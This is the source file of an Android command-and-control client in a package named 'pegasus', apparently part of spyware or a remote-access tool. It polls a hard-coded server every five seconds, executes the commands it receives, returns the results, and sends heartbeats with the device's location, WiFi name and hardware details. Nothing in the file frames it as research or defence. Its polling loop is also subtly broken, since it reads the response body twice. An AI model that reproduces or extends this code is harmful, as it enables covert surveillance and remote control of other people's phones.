package com.pegasus.core

import android.content.Context
import com.pegasus.PegasusApp
import com.pegasus.utils.LogUtils
import com.pegasus.utils.NetworkUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.logging.HttpLoggingInterceptor
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.cancel

class C2Client(private val context: Context) {

    // C2 Configuration
    private val C2_BASE_URL = "http://10.178.181.107:3000/api/v1/"
    private val DEVICE_ID = NetworkUtils.getDeviceId(context)
    private val SECRET_KEY = "PEGASUS-SECURE-KEY-2024"

    private val client: OkHttpClient
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isListening = false

    init {
        val logging = HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        }
        client = OkHttpClient.Builder()
            .addInterceptor(logging)
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()
    }

    fun startListening() {
        if (isListening) return
        isListening = true
        LogUtils.i("C2 Client started listening on $C2_BASE_URL")
        pollCommands()
    }

    fun stopListening() {
        isListening = false
        scope.cancel()
    }

    private fun pollCommands() {
        scope.launch {
            // Use a while loop instead of a for loop with continue
            // This avoids the "break continue in inline lambdas" issue
            while (isListening) {
                try {
                    val request = Request.Builder()
                        .url("$C2_BASE_URL/commands?device_id=$DEVICE_ID")
                        .header("X-Pegasus-Secret", SECRET_KEY)
                        .header("Accept", "application/json")
                        .get()
                        .build()

                    client.newCall(request).execute().use { response ->
                        if (!response.isSuccessful) {
                            LogUtils.e("C2 Poll failed: ${response.code}")
                        } else {
                            val body = response.body?.string() ?: "[]"
                            val commands = JSONArray(body)

                            for (i in 0 until commands.length()) {
                                val cmd = commands.getJSONObject(i)
                                processCommand(cmd)
                            }
                        }

                        val body = response.body?.string() ?: "[]"
                        val commands = JSONArray(body)

                        // Use a traditional for loop for iterating over JSON array
                        // This avoids lambda issues
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            processCommand(cmd)
                        }
                    }
                } catch (e: Exception) {
                    LogUtils.e("C2 Poll Exception: ${e.message}")
                }
                delay(5000) // Poll every 5 seconds
            }
        }
    }

    private fun processCommand(cmd: JSONObject) {
        val type = cmd.optString("type", "unknown")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()
        val id = cmd.optLong("id")

        LogUtils.i("Received Command: $type (ID: $id)")

        scope.launch {
            try {
                // Reference PegasusApp correctly
                val dispatcher = PegasusApp.instance.getDispatcher()
                val result = dispatcher.execute(type, payload)

                // Send result back to C2
                val responsePayload = JSONObject().apply {
                    put("command_id", id)
                    put("status", "success")
                    put("result", result)
                    put("timestamp", System.currentTimeMillis())
                }
                sendResponse(responsePayload)
            } catch (e: Exception) {
                LogUtils.e("Command execution failed: ${e.message}")
                val errorPayload = JSONObject().apply {
                    put("command_id", id)
                    put("status", "error")
                    put("error", e.message)
                }
                sendResponse(errorPayload)
            }
        }
    }

    fun sendResponse(payload: JSONObject) {
        scope.launch {
            try {
                val body = FormBody.Builder()
                    .add("device_id", DEVICE_ID)
                    .add("secret", SECRET_KEY)
                    .add("payload", payload.toString())
                    .build()

                val request = Request.Builder()
                    .url("$C2_BASE_URL/response")
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        LogUtils.e("Failed to send response: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                LogUtils.e("Response send exception: ${e.message}")
            }
        }
    }

    fun sendHeartbeat() {
        val heartbeatData = JSONObject().apply {
            put("battery_level", NetworkUtils.getBatteryLevel(context))
            put("battery_plugged", NetworkUtils.isBatteryPlugged(context))
            put("network_type", NetworkUtils.getNetworkType(context))
            put("wifi_ssid", NetworkUtils.getWifiSSID(context))
            put("location", PegasusApp.instance.getDispatcher().execute("location", JSONObject().put("mode", "once")))
            put("app_version", android.os.Build.VERSION.RELEASE)
            put("device_model", android.os.Build.MODEL)
            put("device_manufacturer", android.os.Build.MANUFACTURER)
        }
        sendResponse(heartbeatData)
    }
}